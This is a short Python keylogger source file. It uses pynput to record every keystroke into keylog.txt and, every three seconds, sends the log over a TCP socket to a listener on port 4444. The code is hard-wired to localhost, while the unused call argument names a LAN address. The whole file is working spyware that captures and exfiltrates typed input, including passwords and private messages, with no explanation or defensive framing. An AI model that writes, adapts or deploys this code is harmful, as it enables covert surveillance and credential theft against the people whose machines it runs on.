from pynput.keyboard import Key, Listener
import logging
import time 
import socket
import _thread

logfile = "keylog.txt"

def conn(ip, port):

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(100)
    try:
        sock.connect(("127.0.0.1", 4444))
        print("connected Sucessfully!")

        data = ""
        with open(logfile, 'rb') as file:
            data = file.read()
            sock.sendall(data)
            print("Log file sent to the server......")
        sock.close()
    except:
        print("connection failed!")


logging.basicConfig(filename = (logfile), level=logging.DEBUG, format='%(asctime)s: %(message)s')
strokes = ""
s1 = time.time()

def on_press(key):
    global s1
    global strokes
    strokes = strokes + ", " + str(key)

    if ((time.time() - s1) >= 3):
        logging.info(strokes)
        strokes = ""
        s1 = time.time()

        _thread.start_new_thread(conn, ("192.168.42.129", 4444, ))

with Listener(on_press=on_press) as Listener:
    Listener.join()
